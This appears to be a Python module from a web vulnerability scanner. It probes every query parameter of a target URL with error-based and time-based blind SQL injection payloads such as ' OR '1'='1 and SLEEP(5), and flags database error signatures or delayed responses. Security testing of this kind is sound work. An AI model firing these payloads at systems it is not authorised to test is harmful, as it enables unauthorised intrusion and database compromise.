import asyncio
import time
import logging
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

logger = logging.getLogger(__name__)

class SQLInjectionTest:
    @staticmethod
    async def scan(url, client):
        """
        Enterprise-grade, automated SQL Injection Scanning Engine.
        Tests for both Error-Based and Time-Based Blind SQLi across all dynamic URL parameters.
        Maintains the exact (url, client) method signature for tasks.py integration.
        """
        findings = []
        
        # 1. Broaden Exception Signatures for all major SQL dialects
        error_signatures = [
            "sql syntax", "mysql_fetch", "native client", "unclosed quotation mark",
            "postgresql error", "ora-00933", "sqlite3.operationalerror", 
            "syntax error in string", "dynamic sql error", "db2inst1"
        ]
        
        error_payloads = ["'", "\"", "' OR '1'='1"]
        time_payloads = ["' AND SLEEP(5)--", '" AND SLEEP(5)--', "' or pg_sleep(5)--"]

        # --- STEP 1: Parse out all active query parameters dynamically ---
        parsed_url = urlparse(url)
        current_params = parse_qs(parsed_url.query)
        
        # Fallback safeguard: If a plain URL has no parameters, inject a default "id" field to test
        if not current_params:
            current_params = {'id': ['']}

        # --- STEP 2: Establish a Baseline Timing Fingerprint ---
        start_baseline = time.time()
        baseline_resp = await client.fetch(url)
        baseline_time = time.time() - start_baseline
        
        # If the target site is completely down or unreachable, stop scanning it immediately
        if not baseline_resp:
            return findings

        # --- STEP 3: Iterate and test every parameter independently ---
        for param_key in current_params.keys():
            
            # --- Phase A: Test for Error-Based SQLi ---
            for payload in error_payloads:
                # Dynamically craft an injection URL replacing only the targeted parameter value
                test_params = current_params.copy()
                test_params[param_key] = [payload]
                
                # Reconstruct clean HTTP URL strings
                new_query = urlencode(test_params, doseq=True)
                test_url = urlunparse(parsed_url._replace(query=new_query))
                
                resp = await client.fetch(test_url)
                if resp and resp.status_code == 200 and resp.text:
                    response_text_lower = resp.text.lower()
                    if any(sig in response_text_lower for sig in error_signatures):
                        findings.append({
                            "type": "SQL Injection (Error-Based)",
                            "url": test_url,
                            "param": param_key,
                            "payload": payload,
                            "evidence": f"Exposed database engine anomaly found matching error signature arrays.",
                            "severity": "HIGH"
                        })
                        break # Found a definitive flaw on this parameter, move to time checks

            # --- Phase B: Test for Time-Based Blind SQLi ---
            for payload in time_payloads:
                test_params = current_params.copy()
                test_params[param_key] = [payload]
                
                new_query = urlencode(test_params, doseq=True)
                test_url = urlunparse(parsed_url._replace(query=new_query))
                
                start_attack = time.time()
                resp = await client.fetch(test_url)
                attack_time = time.time() - start_attack
                
                if not resp:
                    continue

                # Differential Check: Verify the server delay is due to the payload,
                # by ensuring the response time is at least 4.5 seconds AND at least 3x slower than baseline
                if attack_time >= 4.5 and attack_time > (baseline_time * 3):
                    findings.append({
                        "type": "SQL Injection (Time-Based Blind)",
                        "url": test_url,
                        "param": param_key,
                        "payload": payload,
                        "evidence": f"Time anomaly verified. Target responded in {round(attack_time, 2)}s (Baseline: {round(baseline_time, 2)}s).",
                        "severity": "HIGH"
                    })
                    break # Parameter confirmed vulnerable

        return findings
